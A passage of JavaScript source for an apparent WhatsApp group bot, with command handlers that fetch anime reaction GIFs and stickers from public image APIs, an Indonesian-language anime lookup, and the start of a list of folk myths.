
 }

 }

 break;
 case 'happy': {

 if (!m.isGroup) return replygcxeon (mess.group)
 if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
 var pat = await fetchJson(`https://api.waifu.pics/sfw/happy`)

 try {

 let messsender = m.sender

 let musers = ``
 try {

 users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

 ment = [messsender, users]

 } catch {

 users == "none"

 ment = [messsender, m.sender]

 }

 if (users == "none") {

 musers = `@${m.sender.split("@")[0]} happied themself!`

 } else {

 musers = `@${m.sender.split("@")[0]} happied @${users.split("@")[0]} `

 }

 const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

 const buffer = Buffer.from(response.data, "utf-8")

 var fetchedgif = await GIFBufferToVideoBuffer(buffer)

 Yasam.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: fvrif })

 } catch (error) {

 console.log(error);

 }

 }

 break;
 case 'dance': {

 if (!m.isGroup) return replygcxeon (mess.group)
 if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
 var pat = await fetchJson(`https://api.waifu.pics/sfw/dance`)

 try {

 let messsender = m.sender

 let musers = ``
 try {

 users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

 ment = [messsender, users]

 } catch {

 users == "none"

 ment = [messsender, m.sender]

 }

 if (users == "none") {

 musers = `@${m.sender.split("@")[0]} danced themself!`

 } else {

 musers = `@${m.sender.split("@")[0]} danced @${users.split("@")[0]} `

 }

 const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

 const buffer = Buffer.from(response.data, "utf-8")

 var fetchedgif = await GIFBufferToVideoBuffer(buffer)

 Yasam.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: fvrif })

 } catch (error) {

 console.log(error);

 }

 }

 break;
 case 'cringe': {

 if (!m.isGroup) return replygcxeon (mess.group)
 if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
 var pat = await fetchJson(`https://api.waifu.pics/sfw/cringe`)

 try {

 let messsender = m.sender

 let musers = ``
 try {

 users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

 ment = [messsender, users]

 } catch {

 users == "none"

 ment = [messsender, m.sender]

 }

 if (users == "none") {

 musers = `@${m.sender.split("@")[0]} cringed themself!`

 } else {

 musers = `@${m.sender.split("@")[0]} cringed @${users.split("@")[0]} `

 }

 const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

 const buffer = Buffer.from(response.data, "utf-8")

 var fetchedgif = await GIFBufferToVideoBuffer(buffer)

 Yasam.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: fvrif })

 } catch (error) {

 console.log(error);

 }

 }

 break;
 case 'cuddle': {

 if (!m.isGroup) return replygcxeon (mess.group)
 if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
 var pat = await fetchJson(`https://api.waifu.pics/sfw/cuddle`)

 try {

 let messsender = m.sender

 let musers = ``
 try {

 users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

 ment = [messsender, users]

 } catch {

 users == "none"

 ment = [messsender, m.sender]

 }

 if (users == "none") {

 musers = `@${m.sender.split("@")[0]} cuddled themself!`

 } else {

 musers = `@${m.sender.split("@")[0]} cuddled @${users.split("@")[0]} `

 }

 const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

 const buffer = Buffer.from(response.data, "utf-8")

 var fetchedgif = await GIFBufferToVideoBuffer(buffer)

 Yasam.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: fvrif })

 } catch (error) {

 console.log(error);

 }

 }

 break;
 case 'highfive': {

 if (!m.isGroup) return replygcxeon (mess.group)
 if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
 var pat = await fetchJson(`https://api.waifu.pics/sfw/awoo`)

 try {

 let messsender = m.sender

 let musers = ``
 try {

 users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

 ment = [messsender, users]

 } catch {

 users == "none"

 ment = [messsender, m.sender]

 }

 if (users == "none") {

 musers = `@${m.sender.split("@")[0]} highfived themself!`

 } else {

 musers = `@${m.sender.split("@")[0]} highfived @${users.split("@")[0]} `

 }

 const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

 const buffer = Buffer.from(response.data, "utf-8")

 var fetchedgif = await GIFBufferToVideoBuffer(buffer)

 Yasam.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: fvrif })

 } catch (error) {

 console.log(error);

 }

 }

 break;
 case 'handhold': {

 if (!m.isGroup) return replygcxeon (mess.group)
 if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
 var pat = await fetchJson(`https://api.waifu.pics/sfw/handhold`)

 try {

 let messsender = m.sender

 let musers = ``
 try {

 users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

 ment = [messsender, users]

 } catch {

 users == "none"

 ment = [messsender, m.sender]

 }

 if (users == "none") {

 musers = `@${m.sender.split("@")[0]} handheld themself!`

 } else {

 musers = `@${m.sender.split("@")[0]} handheld @${users.split("@")[0]} `

 }

 const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

 const buffer = Buffer.from(response.data, "utf-8")

 var fetchedgif = await GIFBufferToVideoBuffer(buffer)

 Yasam.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: fvrif })

 } catch (error) {

 console.log(error);

 }

 }

 break;
 case 'spank': {

 if (!m.isGroup) return replygcxeon (mess.group)
 if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
 var pat = await fetchJson(`https://nekos.life/api/v2/img/spank`)

 try {

 let messsender = m.sender

 let musers = ``
 try {

 users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

 ment = [messsender, users]

 } catch {

 users == "none"

 ment = [messsender, m.sender]

 }

 if (users == "none") {

 musers = `@${m.sender.split("@")[0]} spanked themself!`

 } else {

 musers = `@${m.sender.split("@")[0]} spanked @${users.split("@")[0]} `

 }

 const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

 const buffer = Buffer.from(response.data, "utf-8")

 var fetchedgif = await GIFBufferToVideoBuffer(buffer)

 Yasam.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: fvrif })

 } catch (error) {

 console.log(error);

 }

 }

 break;

case 'feed': {

 if (!m.isGroup) return replygcxeon (mess.group)
 if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
 var pat = await fetchJson(`https://nekos.life/api/v2/img/feed`)

 try {

 let messsender = m.sender

 let musers = ``
 try {

 users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

 ment = [messsender, users]

 } catch {

 users == "none"

 ment = [messsender, m.sender]

 }

 if (users == "none") {

 musers = `@${m.sender.split("@")[0]} fed themself!`

 } else {

 musers = `@${m.sender.split("@")[0]} fed @${users.split("@")[0]} `

 }

 const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

 const buffer = Buffer.from(response.data, "utf-8")

 var fetchedgif = await GIFBufferToVideoBuffer(buffer)

 Yasam.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: fvrif })

 } catch (error) {

 console.log(error);

 }

 }

 break;
 case 'tickle': {

 if (!m.isGroup) return replygcxeon (mess.group)
 if (!m.mentionedJid[0] && !m.quoted) return replygcxeon(`Tag or reply to a person`)
 var pat = await fetchJson(`https://nekos.life/api/v2/img/tickle`)

 try {

 let messsender = m.sender

 let musers = ``
 try {

 users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

 ment = [messsender, users]

 } catch {

 users == "none"

 ment = [messsender, m.sender]

 }

 if (users == "none") {

 musers = `@${m.sender.split("@")[0]} tickled themself!`

 } else {

 musers = `@${m.sender.split("@")[0]} tickled @${users.split("@")[0]} `

 }

 const response = await axios.get(pat.url, { responseType: 'arraybuffer' })

 const buffer = Buffer.from(response.data, "utf-8")

 var fetchedgif = await GIFBufferToVideoBuffer(buffer)

 Yasam.sendMessage(m.chat, { video: fetchedgif, gifPlayback: true, mentions: ment, caption: musers }, { quoted: fvrif })

 } catch (error) {

 console.log(error);

 }

 }

 break;
case 'shinobu':{
axios.get(`https://api.waifu.pics/sfw/shinobu`)
.then(({data}) => {
Yasam.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickhandhold': {
axios.get(`https://api.waifu.pics/sfw/handhold`)
.then(({data}) => {
Yasam.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickshinobu': {
axios.get(`https://api.waifu.pics/sfw/shinobu`)
.then(({data}) => {
Yasam.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickhighfive': {
axios.get(`https://api.waifu.pics/sfw/highfive`)
.then(({data}) => {
Yasam.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickcuddle': {
axios.get(`https://api.waifu.pics/sfw/cuddle`)
.then(({data}) => {
Yasam.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickcringe': {
axios.get(`https://api.waifu.pics/sfw/cringe`)
.then(({data}) => {
Yasam.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickdance': {
axios.get(`https://api.waifu.pics/sfw/dance`)
.then(({data}) => {
Yasam.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickhappy': {
axios.get(`https://api.waifu.pics/sfw/happy`)
.then(({data}) => {
Yasam.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickglomp': {
axios.get(`https://api.waifu.pics/sfw/glomp`)
.then(({data}) => {
Yasam.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticksmug': {
axios.get(`https://api.waifu.pics/sfw/smug`)
.then(({data}) => {
Yasam.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickblush': {
axios.get(`https://api.waifu.pics/sfw/blush`)
.then(({data}) => {
Yasam.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickawoo': {
axios.get(`https://api.waifu.pics/sfw/awoo`)
.then(({data}) => {
Yasam.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickwave': {
axios.get(`https://api.waifu.pics/sfw/wave`)
.then(({data}) => {
Yasam.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticksmile': {
axios.get(`https://api.waifu.pics/sfw/smile`)
.then(({data}) => {
Yasam.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickslap': {
axios.get(`https://api.waifu.pics/sfw/slap`)
.then(({data}) => {
Yasam.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticknom': {
axios.get(`https://api.waifu.pics/sfw/nom`)
.then(({data}) => {
Yasam.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickpoke': {
axios.get(`https://api.waifu.pics/sfw/poke`)
.then(({data}) => {
Yasam.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickwink': {
axios.get(`https://api.waifu.pics/sfw/wink`)
.then(({data}) => {
Yasam.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickbonk': {
axios.get(`https://api.waifu.pics/sfw/bonk`)
.then(({data}) => {
Yasam.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickbully': {
axios.get(`https://api.waifu.pics/sfw/bully`)
.then(({data}) => {
Yasam.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickyeet': {
axios.get(`https://api.waifu.pics/sfw/yeet`)
.then(({data}) => {
Yasam.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickbite': {
axios.get(`https://api.waifu.pics/sfw/bite`)
.then(({data}) => {
Yasam.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickkiss': {
axios.get(`https://api.waifu.pics/sfw/kiss`)
.then(({data}) => {
Yasam.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticklick': {
axios.get(`https://api.waifu.pics/sfw/lick`)
.then(({data}) => {
Yasam.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickpat': {
axios.get(`https://api.waifu.pics/sfw/pat`)
.then(({data}) => {
Yasam.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickhug': {
axios.get(`https://api.waifu.pics/sfw/hug`)
.then(({data}) => {
Yasam.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickkill': {
axios.get(`https://api.waifu.pics/sfw/kill`)
.then(({data}) => {
Yasam.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickcry': {
axios.get(`https://api.waifu.pics/sfw/cry`)
.then(({data}) => {
Yasam.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'stickspank':{
 axios.get(`https://nekos.life/api/v2/img/spank`)
.then(({data}) => {
Yasam.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'sticktickle':{
 axios.get(`https://nekos.life/api/v2/img/tickle`)
.then(({data}) => {
Yasam.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'woof':
case '8ball':
case 'goose':
case 'gecg':
case 'feed':
case 'avatar':
case 'fox_girl':
case 'lizard':
case 'meow':{
 axios.get(`https://nekos.life/api/v2/img/${command}`)
.then(({data}) => {
Yasam.sendImageAsSticker(from, data.url, m, { packname: global.packname, author: global.author })
})
}
break
case 'animeawoo':{
await replygcxeon (mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/awoo`) 
 await Yasam.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.berhasil}, { quoted:m }).catch(err => {
 return('Error!')
 })
 }
break
case 'animemegumin':{
await replygcxeon (mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/megumin`) 
 await Yasam.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.berhasil}, { quoted:m }).catch(err => {
 return('Error!')
 })
 }
break

case 'animeshinobu':{
await replygcxeon (mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/shinobu`) 
 await Yasam.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.berhasil}, { quoted:m }).catch(err => {
 return('Error!')
 })
 }
break
case 'animehandhold':{
await replygcxeon (mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/handhold`) 
 await Yasam.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.berhasil}, { quoted:m }).catch(err => {
 return('Error!')
 })
 }
break
case 'animehighfive':{
await replygcxeon (mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/highfive`) 
 await Yasam.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.berhasil}, { quoted:m }).catch(err => {
 return('Error!')
 })
 }
break
case 'animecringe':{
await replygcxeon (mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cringe`) 
 await Yasam.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.berhasil}, { quoted:m }).catch(err => {
 return('Error!')
 })
 }
break
case 'animedance':{
await replygcxeon (mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/dance`) 
 await Yasam.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.berhasil}, { quoted:m }).catch(err => {
 return('Error!')
 })
 }
break
case 'animehappy':{
await replygcxeon (mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/happy`) 
 await Yasam.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.berhasil}, { quoted:m }).catch(err => {
 return('Error!')
 })
 }
break
case 'animeglomp':{
await replygcxeon (mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/glomp`) 
 await Yasam.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.berhasil}, { quoted:m }).catch(err => {
 return('Error!')
 })
 }
break
case 'animesmug':{
await replygcxeon (mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smug`) 
 await Yasam.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.berhasil}, { quoted:m }).catch(err => {
 return('Error!')
 })
 }
break
case 'animeblush':{
await replygcxeon (mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/blush`) 
 await Yasam.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.berhasil}, { quoted:m }).catch(err => {
 return('Error!')
 })
 }
break
case 'animewave':{
await replygcxeon (mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wave`) 
 await Yasam.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.berhasil}, { quoted:m }).catch(err => {
 return('Error!')
 })
 }
break
case 'animesmile':{
await replygcxeon (mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/smile`) 
 await Yasam.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.berhasil}, { quoted:m }).catch(err => {
 return('Error!')
 })
 }
break
case 'animepoke':{
await replygcxeon (mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/poke`) 
 await Yasam.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.berhasil}, { quoted:m }).catch(err => {
 return('Error!')
 })
 }
break
case 'animewink':{
await replygcxeon (mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/wink`) 
 await Yasam.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.berhasil}, { quoted:m }).catch(err => {
 return('Error!')
 })
 }
break
case 'animebonk':{
await replygcxeon (mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bonk`) 
 await Yasam.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.berhasil}, { quoted:m }).catch(err => {
 return('Error!')
 })
 }
break
case 'animebully':{
await replygcxeon (mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bully`) 
 await Yasam.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.berhasil}, { quoted:m }).catch(err => {
 return('Error!')
 })
 }
break
case 'animeyeet':{
await replygcxeon (mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/yeet`) 
 await Yasam.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.berhasil}, { quoted:m }).catch(err => {
 return('Error!')
 })
 }
break
case 'animebite':{
await replygcxeon (mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/bite`) 
 await Yasam.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.berhasil}, { quoted:m }).catch(err => {
 return('Error!')
 })
 }
break
case 'animelick':{
await replygcxeon (mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/lick`) 
 await Yasam.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.berhasil}, { quoted:m }).catch(err => {
 return('Error!')
 })
 }
break
case 'animekill':{
await replygcxeon (mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/kill`) 
 await Yasam.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.berhasil}, { quoted:m }).catch(err => {
 return('Error!')
 })
 }
break
case 'animecry':{
await replygcxeon (mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cry`) 
 await Yasam.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.berhasil}, { quoted:m }).catch(err => {
 return('Error!')
 })
 }
break
case 'animewlp':{
await replygcxeon (mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/wallpaper`) 
 await Yasam.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.berhasil}, { quoted:m }).catch(err => {
 return('Error!')
 })
 }
break
case 'animekiss':{
await replygcxeon (mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/kiss`) 
 await Yasam.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.berhasil}, { quoted:m }).catch(err => {
 return('Error!')
 })
 }
break
case 'animehug':{
await replygcxeon (mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/hug`) 
 await Yasam.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.berhasil}, { quoted:m }).catch(err => {
 return('Error!')
 })
 }
break
case 'animeneko':{
await replygcxeon (mess.wait)
 waifudd = await axios.get(`https://waifu.pics/api/sfw/neko`) 
 await Yasam.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.berhasil}, { quoted:m }).catch(err => {
 return('Error!')
 })
 }
break
case 'animepat':{
await replygcxeon (mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/pat`) 
 await Yasam.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.berhasil}, { quoted:m }).catch(err => {
 return('Error!')
 })
 }
break
case 'animeslap':{
await replygcxeon (mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/slap`) 
 await Yasam.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.berhasil}, { quoted:m }).catch(err => {
 return('Error!')
 })
 }
break
case 'animecuddle':{
await replygcxeon (mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/cuddle`) 
 await Yasam.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.berhasil}, { quoted:m }).catch(err => {
 return('Error!')
 })
 }
break
case 'animewaifu':{
await replygcxeon (mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/waifu`) 
 await Yasam.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.berhasil}, { quoted:m }).catch(err => {
 return('Error!')
 })
 }
break
case 'animenom':{
await replygcxeon (mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/nom`) 
 await Yasam.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.berhasil}, { quoted:m }).catch(err => {
 return('Error!')
 })
 }
break
case 'animefoxgirl':{
await replygcxeon (mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/fox_girl`) 
 await Yasam.sendMessage(m.chat, { image: { url:waifudd.data.url} , caption: mess.berhasil}, { quoted:m }).catch(err => {
 return('Error!')
 })
 }
break
case 'animetickle': {
await replygcxeon (mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/tickle`) 
 await Yasam.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.berhasil},{ quoted:m }).catch(err => {
 return('Error!')
 })
 }
break
case 'animegecg': {
await replygcxeon (mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/gecg`) 
 await Yasam.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.berhasil},{ quoted:m }).catch(err => {
 return('Error!')
 })
 }
break
case 'dogwoof': {
await replygcxeon (mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/woof`) 
 await Yasam.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.berhasil},{ quoted:m }).catch(err => {
 return('Error!')
 })
 }
break
case '8ballpool': {
await replygcxeon (mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/8ball`) 
 await Yasam.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.berhasil},{ quoted:m }).catch(err => {
 return('Error!')
 })
 }
break
case 'goosebird': {
await replygcxeon (mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/goose`) 
 await Yasam.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.berhasil},{ quoted:m }).catch(err => {
 return('Error!')
 })
 }
break
case 'animefeed': {
await replygcxeon (mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/feed`) 
 await Yasam.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.berhasil},{ quoted:m }).catch(err => {
 return('Error!')
 })
 }
break
case 'animeavatar': {
await replygcxeon (mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/avatar`) 
 await Yasam.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.berhasil},{ quoted:m }).catch(err => {
 return('Error!')
 })
 }
break
case 'lizardpic': {
await replygcxeon (mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/lizard`) 
 await Yasam.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.berhasil},{ quoted:m }).catch(err => {
 return('Error!')
 })
 }
break
case 'catmeow': {
await replygcxeon (mess.wait)
 waifudd = await axios.get(`https://nekos.life/api/v2/img/meow`) 
 await Yasam.sendMessage(m.chat, {image: {url:waifudd.data.url}, caption: mess.berhasil},{ quoted:m }).catch(err => {
 return('Error!')
 })
 }
break
case 'anime': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return replygcxeon(mess.limit);
				if (!text) {
					return replygcxeon('⚠️ *Judul anime-nya mana, Kak?* Coba ketik nama anime yang mau dicari ya! 🫣');
				}
				const malScraper = require('mal-scraper');
				await replygcxeon('⏳ *Tunggu sebentar ya, Mora lagi cari datanya...* 📚✨');
				const anime = await malScraper.getInfoFromName(text).catch(() => null);
				if (!anime) {
					return replygcxeon('❌ *Yahh, anime yang Kakak cari gak ketemu...* 🥺 Coba ketik judul yang lebih spesifik ya!');
				}
				let animeInfo = `🎀 *《 𝗜𝗡𝗙𝗢 𝗔𝗡𝗜𝗠𝗘 》* 🎀\n\n📚 *Judul:* ${anime.title}\n🎭 *Tipe:* ${anime.type}\n📅 *Tayang Perdana:* ${anime.premiered || '-'}\n🎬 *Total Episode:* ${anime.episodes || '-'}\n📈 *Status:* ${anime.status || '-'}\n💠 *Genre:* ${anime.genres || '-'}\n🏢 *Studio:* ${anime.studios || '-'}\n⭐ *Skor:* ${anime.score || '-'}\n🔖 *Rating:* ${anime.rating || '-'}\n🏅 *Peringkat:* ${anime.ranked || '-'}\n🔥 *Popularitas:* ${anime.popularity || '-'}\n🎥 *Trailer:* ${anime.trailer || '-'}\n🌐 *Link MAL:* ${anime.url || '-'}\n📝 *Deskripsi:* ${anime.synopsis || 'Tidak ada deskripsi tersedia.'}\n\n✨ *Selamat menikmati info animenya, Kak!* 😊🎌`;
				await Yasam.sendMessage(
					m.chat,
					{ 
						image: { url: anime.picture || thumbUrl }, 
						caption: animeInfo 
					},
					{ quoted: m }
				);
			}
			db.data.users[m.sender].limit -= 1;
			break;
case 'mitos': {
				if (!isPremium && db.data.users[m.sender].limit < 1) return replygcxeon(mess.limit);
				const myths = [
					'🌕 *Mitos Bulan Purnama:* Banyak orang percaya bahwa bulan purnama bisa memengaruhi perilaku manusia, menyebabkan kegilaan, dan meningkatkan angka kejahatan.',
					'🪞 *Mitos Cermin Pecah:* Memecahkan cermin dipercaya membawa nasib buruk selama 7 tahun.',
					'👻 *Mitos Hantu di Pohon Beringin:* Pohon beringin sering dikaitkan dengan makhluk halus dan dipercaya sebagai tempat tinggal roh gentayangan.',
					'🐈‍⬛ *Mitos Kucing Hitam:* Melihat kucing hitam melintas di depanmu sering dianggap sebagai pertanda sial.',
					'💍 *Mitos Cincin di Jari Tengah:* Memakai cincin di jari tengah dipercaya dapat menarik energi positif dan keberuntungan.',
					'🧂 *Mitos Menumpahkan Garam:* Menumpahkan garam dipercaya membawa nasib buruk, kecuali jika dilemparkan ke bahu kiri.',
					'🔮 *Mitos Bola Kristal:* Bola kristal sering dikaitkan dengan kemampuan meramal masa depan.',
					'🎋 *Mitos Pohon Bamboo:* Pohon bamboo di halaman rumah dipercaya bisa mengundang energi positif dan membawa keberuntungan.',
					'🌠 *Mitos Bintang Jatuh:* Jika melihat bintang jatuh dan membuat permintaan, maka permintaan itu akan terkabul.',
					'🐦 *Mitos Burung Masuk Rumah:* Burung yang masuk ke dalam rumah sering dianggap sebagai pertanda akan ada tamu atau berita penting.',
					'🌧️ *Mitos Hujan di Hari Pernikahan:* Hujan di hari pernikahan sering dianggap sebagai pertanda keberuntungan dan kebahagiaan.',
					'🍃 *Mitos Daun Jatuh di Kepala:* Jika ada daun jatuh di kepala seseorang, dipercaya orang itu akan mendapat keberuntungan.',
					'🦉 *Mitos Burung Hantu:* Burung hantu sering dianggap sebagai simbol kematian atau pertanda buruk di beberapa budaya.',
					'🖤 *Mitos Warna Hitam:* Warna hitam sering dikaitkan dengan kesialan dan energi negatif.',
